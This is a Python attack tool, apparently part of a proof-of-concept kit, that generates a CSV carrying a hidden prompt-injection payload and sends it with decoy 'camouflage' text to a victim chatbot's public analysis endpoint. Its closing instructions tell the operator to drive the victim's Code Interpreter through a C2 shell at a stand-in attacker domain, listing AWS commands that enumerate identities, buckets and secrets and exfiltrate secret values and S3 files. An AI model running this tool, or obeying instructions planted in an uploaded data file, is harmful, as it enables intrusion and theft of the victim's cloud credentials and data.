#!/usr/bin/env python3
"""
Attack Client for Prompt Injection via Victim Chatbot

This tool automates the attack process:
1. Generates a malicious CSV with embedded payload
2. Sends it to the victim's publicly-accessible chatbot API
3. Returns the session ID for C2 interaction

The attack demonstrates that an attacker needs NO AWS credentials -
only access to the victim's public API endpoint.

Usage:
    python attack_client.py --target https://chatbot.victim.com --c2-domain c2.attacker.com
"""

import argparse
import os
import sys
import time
import tempfile
from pathlib import Path

# Try to import requests, provide helpful error if not installed
try:
    import requests
except ImportError:
    print("Error: 'requests' module not installed.", file=sys.stderr)
    print("Install with: pip install requests", file=sys.stderr)
    sys.exit(1)

# Add src directory to path
SCRIPT_DIR = Path(__file__).parent.absolute()
sys.path.insert(0, str(SCRIPT_DIR))

from csv_payload_generator import generate_malicious_csv, generate_session_id


class AttackClient:
    """
    HTTP client for sending prompt injection payloads to victim chatbot.

    This class encapsulates the attack workflow:
    1. Generate malicious CSV with embedded C2 payload
    2. Send to victim's /analyze/csv endpoint
    3. Track session for C2 interaction
    """

    def __init__(self, target_url: str, c2_domain: str, verbose: bool = False):
        """
        Initialize the attack client.

        Args:
            target_url: Victim chatbot URL (e.g., https://chatbot.victim.com)
            c2_domain: C2 server domain (e.g., c2.attacker.com)
            verbose: Enable verbose output
        """
        self.target_url = target_url.rstrip('/')
        self.c2_domain = c2_domain
        self.verbose = verbose
        self.session_id = None

    def log(self, message: str, level: str = "info") -> None:
        """Log a message with optional verbosity control."""
        prefixes = {
            "info": "[*]",
            "success": "[+]",
            "error": "[-]",
            "warning": "[!]",
            "debug": "[D]"
        }
        prefix = prefixes.get(level, "[*]")

        if level == "debug" and not self.verbose:
            return

        print(f"{prefix} {message}")

    def generate_payload(self, output_path: str = None) -> str:
        """
        Generate malicious CSV with embedded payload.

        Args:
            output_path: Optional path for CSV file

        Returns:
            Path to generated CSV file
        """
        if output_path is None:
            # Create temp file
            fd, output_path = tempfile.mkstemp(suffix='.csv', prefix='attack_')
            os.close(fd)

        self.session_id = generate_session_id()

        info = generate_malicious_csv(
            c2_domain=self.c2_domain,
            session_id=self.session_id,
            output_path=output_path,
            injection_row=3,
            injection_style="technical"
        )

        self.log(f"Generated payload: {output_path}", "success")
        self.log(f"Session ID: {self.session_id}", "info")

        return output_path

    def send_attack(
        self,
        csv_path: str,
        message: str = "Please analyze the revenue by customer and show me the top performers",
        timeout: int = 120
    ) -> dict:
        """
        Send malicious CSV to victim's analyze endpoint.

        Args:
            csv_path: Path to malicious CSV file
            message: Analysis request message (camouflage)
            timeout: Request timeout in seconds

        Returns:
            Dict with status and response info
        """
        url = f"{self.target_url}/analyze/csv"

        self.log(f"Target URL: {url}", "info")
        self.log(f"Sending attack...", "info")

        try:
            with open(csv_path, 'rb') as f:
                files = {
                    'file': ('customer_analysis.csv', f, 'text/csv')
                }
                data = {
                    'message': message
                }

                response = requests.post(
                    url,
                    files=files,
                    data=data,
                    timeout=timeout
                )

            if response.status_code == 200:
                result = response.json()
                self.log("Attack sent successfully!", "success")
                self.log(f"Response preview: {str(result.get('response', ''))[:200]}...", "debug")

                return {
                    "status": "success",
                    "session_id": self.session_id,
                    "response": result
                }

            else:
                self.log(f"HTTP {response.status_code}: {response.text[:200]}", "error")
                return {
                    "status": "error",
                    "session_id": self.session_id,
                    "error": f"HTTP {response.status_code}",
                    "detail": response.text[:500]
                }

        except requests.exceptions.Timeout:
            # Timeout is often expected - payload may be executing
            self.log("Request timed out (payload may be executing)", "warning")
            return {
                "status": "timeout",
                "session_id": self.session_id,
                "message": "Request timed out - payload execution likely in progress"
            }

        except requests.exceptions.ConnectionError as e:
            self.log(f"Connection error: {e}", "error")
            return {
                "status": "connection_error",
                "session_id": self.session_id,
                "error": str(e)
            }

        except Exception as e:
            self.log(f"Unexpected error: {e}", "error")
            return {
                "status": "error",
                "session_id": self.session_id,
                "error": str(e)
            }

    def run_full_attack(self, message: str = None) -> str:
        """
        Execute full attack workflow.

        Returns:
            Session ID for C2 interaction
        """
        print("\n" + "=" * 70)
        print("  PROMPT INJECTION ATTACK - DNS EXFILTRATION")
        print("=" * 70)

        print(f"\n  Target:     {self.target_url}")
        print(f"  C2 Domain:  {self.c2_domain}")
        print()

        # Step 1: Generate payload
        print("-" * 70)
        print("  STEP 1: Generate malicious CSV")
        print("-" * 70)
        csv_path = self.generate_payload()

        # Step 2: Send to victim
        print()
        print("-" * 70)
        print("  STEP 2: Send to victim chatbot")
        print("-" * 70)

        if message is None:
            message = "Please analyze the revenue data and show me the top 10 customers by total revenue."

        result = self.send_attack(csv_path, message)

        # Step 3: Report results
        print()
        print("-" * 70)
        print("  RESULT")
        print("-" * 70)

        if result["status"] == "success":
            print(f"\n  [SUCCESS] Attack delivered successfully!")
        elif result["status"] == "timeout":
            print(f"\n  [LIKELY SUCCESS] Request timed out - payload probably executing")
        else:
            print(f"\n  [ISSUE] {result.get('error', 'Unknown error')}")

        print(f"\n  Session ID: {self.session_id}")

        # Cleanup temp file
        try:
            os.unlink(csv_path)
        except:
            pass

        print()
        print("=" * 70)
        print("  NEXT STEPS")
        print("=" * 70)
        print(f"""
  The payload should now be running in the victim's Code Interpreter.
  Use the operator shell to interact with the compromised session:

  1. Start operator shell:
     make operator

  2. Set active session:
     session {self.session_id}

  3. Send commands:
     send whoami
     send aws sts get-caller-identity
     send aws s3 ls
     send aws dynamodb list-tables
     send aws secretsmanager list-secrets

  4. Exfiltrate sensitive data:
     send aws s3 cp s3://BUCKET/sensitive.csv -
     send aws secretsmanager get-secret-value --secret-id SECRET_ARN
""")
        print("=" * 70 + "\n")

        return self.session_id


def main():
    parser = argparse.ArgumentParser(
        description="Send prompt injection attack to victim chatbot",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  Basic attack:
    python attack_client.py --target https://chatbot.victim.com --c2-domain c2.attacker.com

  Attack with custom message:
    python attack_client.py --target https://chatbot.victim.com --c2-domain c2.attacker.com \\
        --message "Show me Q4 revenue breakdown"

  Verbose mode:
    python attack_client.py --target https://chatbot.victim.com --c2-domain c2.attacker.com -v
"""
    )

    parser.add_argument(
        "--target", "-t",
        required=True,
        help="Victim chatbot URL (e.g., https://chatbot.victim.com)"
    )
    parser.add_argument(
        "--c2-domain", "-c",
        required=True,
        help="C2 server domain (e.g., c2.attacker.com)"
    )
    parser.add_argument(
        "--message", "-m",
        default=None,
        help="Analysis request message (camouflage text)"
    )
    parser.add_argument(
        "--timeout",
        type=int,
        default=120,
        help="Request timeout in seconds (default: 120)"
    )
    parser.add_argument(
        "--verbose", "-v",
        action="store_true",
        help="Enable verbose output"
    )
    parser.add_argument(
        "--session-only",
        action="store_true",
        help="Only output session ID (for scripting)"
    )

    args = parser.parse_args()

    client = AttackClient(
        target_url=args.target,
        c2_domain=args.c2_domain,
        verbose=args.verbose
    )

    session_id = client.run_full_attack(message=args.message)

    if args.session_only:
        print(session_id)


if __name__ == "__main__":
    main()
